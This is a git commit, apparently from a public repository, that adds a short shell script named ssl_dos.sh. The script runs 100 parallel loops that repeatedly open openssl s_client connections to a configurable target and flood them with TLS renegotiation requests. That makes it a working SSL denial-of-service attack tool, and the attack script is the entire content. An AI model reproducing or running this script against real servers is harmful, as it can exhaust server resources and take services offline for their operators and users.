2d1ea3c58547c1ffbba275820581e36e2a07f60c
NuclearReactor314 <145520137+NuclearReactor314@users.noreply.github.com>
2023-12-13 12:24:33 -0800

    Create ssl_dos.sh

---
+++ ssl_dos.sh
@@ -0,0 +1,16 @@
+target=127.0.0.1 # IP
+port=443
+parallel=100
+
+thc-ssl-dosit()
+{
+    while :;
+    do
+        (while :; do echo R; done) | openssl s_client -connect $target:$port 2>/dev/null;
+    done
+}
+
+for x in `seq 1 $parallel`;
+do
+    thc-ssl-dosit &
+done
